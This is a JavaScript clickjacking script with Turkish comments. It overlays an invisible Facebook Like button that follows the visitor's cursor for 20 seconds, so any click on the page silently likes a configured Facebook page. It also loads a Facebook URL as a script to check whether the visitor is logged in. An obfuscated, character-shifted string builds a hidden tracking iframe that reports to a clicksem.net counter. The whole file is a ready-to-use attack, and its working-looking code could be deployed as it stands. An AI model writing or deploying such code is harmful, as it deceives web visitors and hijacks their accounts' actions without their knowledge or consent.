var cookiesuresi=1;   //saat olarak
var test=1;//test edileceği zaman burası 1 kalsın. daha iyi test edebilmek için cookie kontrolünü iptal ediyor. test bitince 0 yap bunu.
var sure=20;  //iptal olma sÃ¼resi(saniye olarak)
var sayfa="http://www.facebook.com/pages/37numara/139093162818635";  //Begenilecek facebook sayfasi url'si

var siteismi="ClickSEM";   //Buraya takip edilecek sitenin yada sayfanin ismi yazilir.  Direk site adresi olmak zorunda degil kafana gÃ¶re isim ver.

var myencoder = {

  get:function(input){
	 var output="";
	 var i=0;
	 while ( i < input.length) {
		var chr1 = input.charCodeAt(i);
		output+=String.fromCharCode(chr1-1);
		i++;
		}
	return output;
  }
 }
Date.prototype.addHours= function(h){
    this.setHours(this.getHours()+h);
    return this;
}

function setCookie(c_name,value,exhours)
{
	var exdate=new Date();
	exdate.addHours(exhours);
	var c_value=escape(value) + ((exhours==null) ? "" : "; expires="+exdate.toUTCString());
	document.cookie=c_name + "=" + c_value;
}

function getCookie(c_name)
{
	var i,x,y,ARRcookies=document.cookie.split(";");
	for (i=0;i<ARRcookies.length;i++)
	{
	  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
	  y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
	  x=x.replace(/^\s+|\s+$/g,"");
	  if (x==c_name)
		{
		return unescape(y);
		}
  }
}
 function doJack(){

  var IE = document.all ? true : false;
    function mouseMove(e) {
		if (IE) {
		  tempX = event.clientX + document.body.scrollLeft;
		  tempY = event.clientY + document.body.scrollTop;
		} else {
		  tempX = e.pageX;
		  tempY = e.pageY;
		}

		if (tempX < 0) tempX = 0;
		if (tempY < 0) tempY = 0;

		like.style.top = (tempY - 5) + 'px';
		like.style.left = (tempX - 5) + 'px';

		return true
  }
    setCookie("cjuser","cjuservalue",cookiesuresi);

  var tempX = 0,
  tempY = 0;


   document.captureEvents(Event.MOUSEMOVE);

  var like = document.createElement('iframe');
  like.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent(sayfa) + 
	'&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80';
  like.scrolling = 'no';
  like.frameBorder = 0;
  like.allowTransparency = 'true';
  like.style.border = 0;
  like.style.overflow = 'hidden';
  like.style.cursor = 'pointer';
  like.style.width = '10px';
  like.style.height =  '10px';
  like.style.position = 'absolute';
  like.style.opacity = 0; //Would be 0 if really used
  //console.info(document);
  document.getElementsByTagName('body')[0].appendChild(like);
  
 var counter=myencoder.get('=jgsbnf!gsbnfcpsefs>#1#!tsd>#iuuq;00xxx/dmjdltfn/ofu0dmjdlkbdl0dpvou/qiq@obnf>$tjufobnf$#!tuzmf>#pwfsgmpx;ijeefo<#!xjeui>1!ifjhiu>1!bmmpxusbotqbsfodz>#usvf#?=0jgsbnf?');

 // console.log(counter);
  counter=counter.replace("#sitename#",siteismi);

  var mydiv=document.createElement("div");
  
  mydiv.innerHTML=counter;
  
  var likex=mydiv.firstChild;
  document.getElementsByTagName('body')[0].appendChild(likex);

if(window.addEventListener)
  window.addEventListener('mousemove', mouseMove, false);
else  window.attachEvent('mousemove', mouseMove);
  setTimeout(function(){
 
    document.getElementsByTagName('body')[0].removeChild(like);
	if(window.removeEventListener)
    window.removeEventListener('mousemove', mouseMove, false);
	else window.detachEvent('onmousemove', mouseMove)
  }, 1000*sure);


}
 
function startit(){
var username=getCookie("cjuser");
  if (username!=null && username!=""&&!test)
  {
return;
  }
else
  {
  	
	 var isIE = document.all ? true : false;
	
	if(!isIE){
		var script = document.createElement('script');
		script.src = 'https://www.facebook.com/imike3';

		script.onreadystatechange =function(){
		
		};
		script.onload = function(){
		doJack();

		};
		script.onerror = function(){

		};
		document.body.appendChild(script);
  }else
  {
	//doJack();
  }
}
}
startit();
  